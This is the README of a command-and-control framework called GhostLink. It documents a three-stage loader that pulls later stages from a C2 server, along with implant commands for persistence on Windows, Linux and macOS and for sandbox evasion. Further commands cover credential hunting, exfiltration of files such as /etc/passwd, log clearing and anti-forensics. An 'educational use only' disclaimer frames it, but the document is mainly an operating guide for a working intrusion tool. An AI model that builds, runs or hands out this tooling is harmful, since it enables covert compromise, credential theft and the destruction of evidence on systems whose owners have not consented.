# GhostLink C2 Framework - ENHANCED ⭐

A complete Command & Control (C2) framework with advanced features for authorized security testing.

## 🆕 New Enhanced Features

### ✅ Multi-Platform Support
- **Windows**: Registry persistence, Scheduled Tasks, Token Impersonation, UAC bypass checks
- **Linux**: Cron, systemd, rc.local persistence
- **macOS**: LaunchAgent persistence

### ✅ Multi-Stage Loading
- **Stage 1 (Loader)**: Lightweight initial footprint (~500 bytes)
- **Stage 2 (Stager)**: Downloads and executes full agent
- **Stage 3 (Implant)**: Encrypted full-featured agent

### ✅ Advanced Encoding Schemes
- Base64, Hex, ROT13
- Chained encoding (Base64→Hex, Hex→ROT13)
- Customizable per beacon

### ✅ Evasion Techniques
- Random User-Agent rotation
- Randomized beacon intervals with variance
- Sandbox/VM detection
- Output truncation to avoid suspicion
- Pattern randomization for ML detection evasion

### ✅ Advanced Features
- **Privilege Escalation**: sudo check, kernel exploit detection, UAC bypass
- **Lateral Movement**: Network share enumeration, user discovery
- **Data Exfiltration**: Sensitive file search, credential hunting
- **Defense Evasion**: Log clearing, anti-forensics, temp file cleanup
- **Process Management**: Process enumeration, injection helpers

### ✅ Persistence Mechanisms
- Windows Registry Run keys
- Windows Scheduled Tasks (hidden)
- Linux Crontab entries
- Linux systemd services
- macOS LaunchAgents

---

## 📁 Project Structure

```
GhostLink/
├── Listener.py              # C2 Server (Flask + REST API)
├── Implant.py               # Full-featured Agent with all enhancements
├── loader.py                # Multi-stage loader system
├── Controller.py            # Interactive command interface
├── utils.py                 # Encoding, evasion, utilities
├── persistence.py           # Multi-platform persistence
├── advanced.py              # Privilege escalation, lateral movement, etc.
├── ghostlink.db             # SQLite database
├── requirements.txt         # Dependencies
├── README.md                # This file
├── IMPLEMENTATION.md        # Technical details
└── ENHANCEMENTS.md         # Enhancement documentation
```

---

## 🚀 Quick Start

### Installation

```bash
cd /Users/aryanraj/Documents/Aryan_Project/GhostLink
pip install -r requirements.txt
```

### Start Server
```bash
python3 Listener.py
# Server listens on 0.0.0.0:8888
# API endpoints: /beacon, /result, /stage2, /stage3, /agents, /send_command
```

### Start Agent
```bash
# Basic mode
python3 Implant.py

# With enhanced features enabled
# Edit Implant.py to set:
# ENABLE_PERSISTENCE = True
# ENABLE_EVASION = True
```

### Control Agents
```bash
python3 Controller.py

# Available commands:
# agents                    - List all connected agents
# send Agent_01 "whoami"    - Send command
# interact Agent_01         - Interactive shell
```

---

## 💡 New Features Explained

### 1. Multi-Stage Loading

**Scenario**: You want a small initial footprint

```python
# Stage 1: Tiny loader (< 1KB)
python3 loader.py http://c2-server.com

# Automatically downloads Stage 2 and Stage 3
# Full agent loaded into memory
```

### 2. Persistence Installation

```bash
GhostLink> send Agent_01 "persistence"           # Auto-detect OS
GhostLink> send Agent_01 "persistence registry"  # Windows Registry
GhostLink> send Agent_01 "persistence cron"      # Linux Cron
GhostLink> send Agent_01 "persistence launchagent"  # macOS
```

### 3. Advanced Commands

```bash
GhostLink> send Agent_01 "privesc_check"       # Check sudo rights
GhostLink> send Agent_01 "kernel_exploit"      # Check vulnerable kernels
GhostLink> send Agent_01 "enum_users"          # List system users
GhostLink> send Agent_01 "find_creds"          # Hunt for credentials
GhostLink> send Agent_01 "enum_shares"         # Network shares
GhostLink> send Agent_01 "list_processes"      # Running processes
GhostLink> send Agent_01 "clear_logs"          # Clear system logs
GhostLink> send Agent_01 "anti_forensics"      # Cleanup artifacts
```

### 4. Custom Encoding

```python
# In Implant.py, change:
ENCODING_SCHEME = "hex"  # or "rot13", "chain", etc.

# Payload automatically encodes using selected scheme
# Server decodes transparently
```

### 5. Evasion Features

```python
# In Implant.py:
ENABLE_EVASION = True

# Features enabled:
# - Random User-Agent per request
# - Randomized beacon intervals ±3 seconds
# - Sandbox detection before running
# - Output truncation
# - Pattern randomization
```

---

## 🔓 Privilege Escalation Module

```python
from advanced import PrivilegeEscalation

# Check if sudo works without password
PrivilegeEscalation.check_sudo_privileges()

# Detect vulnerable kernels
PrivilegeEscalation.linux_kernel_exploit()

# Windows UAC bypass methods
PrivilegeEscalation.uac_bypass_check()

# Token enumeration
PrivilegeEscalation.windows_token_impersonation()
```

---

## 🕸️ Lateral Movement Module

```python
from advanced import LateralMovement

# Find accessible network shares
LateralMovement.enumerate_network_shares()

# Find writable network paths
LateralMovement.find_writable_network_paths()

# List system users
LateralMovement.enumerate_users()
```

---

## 📤 Data Exfiltration Module

```python
from advanced import DataExfiltration

# Find sensitive files
DataExfiltration.read_sensitive_files()

# Search for credentials
DataExfiltration.search_for_credentials()

# Read and exfiltrate specific file
DataExfiltration.exfiltrate_file("/etc/passwd")
```

---

## 🛡️ Persistence Mechanisms

### Windows Persistence

```python
from persistence import PersistenceManager

pm = PersistenceManager()

# Registry method (simple, fast)
pm.windows_registry_persistence("/path/to/implant.py")

# Scheduled Task method (hidden, reliable)
pm.windows_scheduled_task_persistence("/path/to/implant.py")
```

### Linux Persistence

```python
# Crontab method (noisy but reliable)
pm.linux_cron_persistence("/path/to/implant.py")

# systemd method (modern, clean)
pm.linux_systemd_persistence("/path/to/implant.py")

# rc.local method (requires root)
pm.linux_rclocal_persistence("/path/to/implant.py")
```

### macOS Persistence

```python
# LaunchAgent method (native, preferred)
pm.macos_launchagent_persistence("/path/to/implant.py")
```

---

## 🎭 Evasion Techniques

```python
from utils import EvasionTechniques

# Randomize beacon intervals
interval = EvasionTechniques.randomize_beacon_interval(base=10, variance=5)

# Generate random User-Agent
ua = EvasionTechniques.generate_random_useragent()

# Detect sandbox environment
if EvasionTechniques.detect_sandboxed_environment():
    sys.exit()

# Truncate suspicious large output
output = EvasionTechniques.hide_command_output(raw_output, max_lines=50)

# Random sleep pattern (detection evasion)
sleep_time = EvasionTechniques.randomize_sleep_pattern()
```

---

## 🔐 Encoding Schemes

```python
from utils import EncodingSchemes

# Single encoding
base64_encoded = EncodingSchemes.base64_encode("data")
hex_encoded = EncodingSchemes.hex_encode("data")
rot13_encoded = EncodingSchemes.rot13_encode("data")

# Chained encoding
chained = EncodingSchemes.chain_encode("data", "base64_hex")
# Result: Base64 → Hex

# Decrypt/Decode
plain = EncodingSchemes.chain_decode(chained, "base64_hex")
```

---

## 📊 Proxy Support

```python
# In Implant.py, set proxy configuration:
PROXY_SUPPORT = {
    "http": "http://proxy-ip:port",
    "https": "https://proxy-ip:port"
}

# Agent automatically routes through proxy
```

---

## 🗂️ API Endpoints

### Stage Loading
- **POST /stage2** - Fetch lightweight stager
- **POST /stage3** - Fetch full encrypted implant

### Agent Communication
- **POST /beacon** - Agent beacons for commands
- **POST /result** - Agent sends command results
- **GET /agents** - List connected agents
- **POST /send_command** - Queue command for agent

---

## 📈 Performance & Scalability

| Metric | Value |
|--------|-------|
| Beacon Interval | 10 sec (customizable, random ±3 sec) |
| Command Timeout | 10 seconds |
| Connection Timeout | 5 seconds |
| Max Output Size | Configurable |
| Encryption | AES-128 (Fernet) |
| Multi-stage Load Time | ~500ms |

---

## ⚠️ Disclaimer

```
╔════════════════════════════════════════════════════════════════╗
║  EDUCATIONAL USE ONLY - AUTHORIZED TESTING ONLY               ║
║  Unauthorized access to computer systems is ILLEGAL             ║
║  Only use in controlled environments with explicit permission   ║
║  Violators may face criminal prosecution                        ║
╚════════════════════════════════════════════════════════════════╝
```

---

## 📚 Documentation

- [IMPLEMENTATION.md](IMPLEMENTATION.md) - Technical architecture
- [ENHANCEMENTS.md](ENHANCEMENTS.md) - Detailed enhancement documentation
- [utils.py](utils.py) - Encoding and evasion utilities
- [persistence.py](persistence.py) - Persistence mechanisms
- [advanced.py](advanced.py) - Advanced exploitation features
- [loader.py](loader.py) - Multi-stage loading system

---

## 🎯 Key Improvements Over Basic Version

| Feature | Basic | Enhanced |
|---------|-------|----------|
| Platforms | macOS | Win/Linux/Mac |
| Persistence | None | Multi-method |
| Encoding | Single | Multiple + chained |
| Evasion | None | Full suite |
| Stages | Single | 3-stage |
| Privilege Escalation | None | Detection + helpers |
| Lateral Movement | None | Share/User enum |
| Data Exfiltration | Shell output | Credential hunting |
| Process Injection | None | Framework included |
| Anti-forensics | None | Log clearing |

---

## 🔮 Future Enhancements

- [ ] Machine learning-based behavior randomization
- [ ] Direct socket communication (not just HTTP)
- [ ] DNS tunneling for C2
- [ ] HTTPS with certificate pinning
- [ ] Hardware fingerprinting
- [ ] Process hollowing
- [ ] Code obfuscation with packing
- [ ] Rootkit deployment
- [ ] Distributed C2 with P2P comms
- [ ] Mobile platform support

---

## ❓ FAQ

**Q: Is this malware?**
A: No, this is an educational C2 framework for authorized security testing.

**Q: Can I use this for penetration testing?**
A: Only with written authorization from the system owner.

**Q: Does it work on [platform]?**
A: See multi-platform support section above.

**Q: How do I detect this?**
A: Look for suspicious processes, network connections, registry modifications, cron jobs, and launchd entries.

---

**Version**: 1.0
**Last Updated**: 9 January 2026
**Status**: Fully Operational ✅
